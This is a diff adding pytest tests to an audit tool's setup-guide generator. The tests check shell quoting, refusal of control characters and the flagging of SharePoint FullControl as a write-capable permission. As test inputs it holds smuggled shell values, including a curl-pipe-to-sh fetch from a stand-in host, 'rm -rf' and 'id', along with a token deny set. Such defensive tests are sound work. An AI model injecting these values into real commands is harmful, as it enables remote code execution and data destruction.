@@ -370,3 +370,80 @@ def test_reader_app_guide_check_command_reaches_the_certificate_check(tmp_path, 
     assert rc == 2
     assert "The certificate key file could not be used" in caplog.text
     assert not (tmp_path / "audit-output").exists()
+
+
+# R097: values are shell-quoted in the verification commands, so a path with a space stays one argument and a value
+# carrying shell syntax cannot add a pipeline to a command the operator pastes.
+INJECTED = "acme; curl -s https://x.example/p | sh"
+
+
+@pytest.mark.parametrize("auth", ["domain-delegation", "oauth"])
+def test_google_commands_quote_every_value(auth: str) -> None:
+    guide = build_setup_guide(
+        provider="google", auth=auth, tenant_name=INJECTED, service_account_key="/data/My Keys/sa.json",
+        oauth_client="/data/My Keys/client.json", token_cache="cache dir/token.json", subject="a b@example.com",
+        domain="example.com", customer_id="C0 1",
+    )
+    for name, command in guide["commands"].items():
+        argv = shlex.split(command)
+        assert not {"|", ";", "sh", "curl"} & set(argv), name
+        if name != "doctor":
+            assert argv[argv.index("--tenant-name") + 1] == INJECTED
+        if auth == "domain-delegation":
+            assert argv[argv.index("--service-account-key") + 1] == "/data/My Keys/sa.json"
+            assert argv[argv.index("--subject") + 1] == "a b@example.com"
+        else:
+            assert argv[argv.index("--oauth-client") + 1] == "/data/My Keys/client.json"
+            assert argv[argv.index("--token-cache") + 1] == "cache dir/token.json"
+        assert argv[argv.index("--customer-id") + 1] == "C0 1"
+
+
+def test_m365_commands_quote_every_value() -> None:
+    guide = build_setup_guide(provider="m365", tenant_name=INJECTED, tenant_id="contoso.onmicrosoft.com; id", collectors="identity")
+    for name, command in guide["commands"].items():
+        argv = shlex.split(command)
+        assert not {"|", ";", "sh", "curl", "id"} & set(argv), name
+        assert argv[argv.index("--tenant-name") + 1] == INJECTED
+        assert argv[argv.index("--tenant-id") + 1] == "contoso.onmicrosoft.com; id"
+
+
+# R060: the SharePoint application permission sharepoint_admin needs is named in the plan with its blast radius.
+def test_sharepoint_admin_plan_names_sites_fullcontrol_with_its_blast_radius() -> None:
+    guide = build_setup_guide(provider="m365", collectors="sharepoint_admin,identity")
+
+    assert guide["sharepoint_application_permissions"] == ["Sites.FullControl.All"]
+    warnings = {row["permission"]: row for row in guide["scope_warnings"]}
+    assert warnings["Sites.FullControl.All"]["risk"] == "write_capable"
+    assert "full control of every site" in warnings["Sites.FullControl.All"]["note"]
+    assert guide["provider_assertions"]["broad_permissions_recorded_as_scope_risk"] is True
+    markdown = render_setup_guide_markdown(guide)
+    assert "## SharePoint Application Permissions" in markdown
+    assert "`Sites.FullControl.All` (Office 365 SharePoint Online, not Microsoft Graph)" in markdown
+    assert "- `Sites.FullControl.All`: " in markdown.split("## Scope Risk Notes", 1)[1]
+
+
+def test_a_plan_without_sharepoint_admin_names_no_sharepoint_application_permission() -> None:
+    guide = build_setup_guide(provider="m365", collectors="identity")
+    assert guide["sharepoint_application_permissions"] == []
+    assert "FullControl" not in json.dumps(guide)
+
+
+def test_fullcontrol_is_a_write_capable_token() -> None:
+    from auditex.setup_guide import M365_WRITE_CAPABLE_TOKENS
+
+    assert any(token in "Sites.FullControl.All" for token in M365_WRITE_CAPABLE_TOKENS)
+
+
+@pytest.mark.parametrize(
+    "arguments",
+    [
+        {"provider": "m365", "tenant_id": "contoso.onmicrosoft.com\n```\n# pasted", "collectors": "identity"},
+        {"provider": "m365", "tenant_name": "acme\r\nrm -rf x", "collectors": "identity"},
+        {"provider": "google", "subject": "admin@example.com\n```"},
+        {"provider": "google", "service_account_key": "key.json\x1b[2K"},
+    ],
+)
+def test_command_values_with_line_breaks_or_control_characters_are_refused(arguments: dict) -> None:
+    """Review round 1: a line break could close the Markdown command fence of the rendered guide."""
+    with pytest.raises(ValueError, match="control character"):
+        build_setup_guide(**arguments)
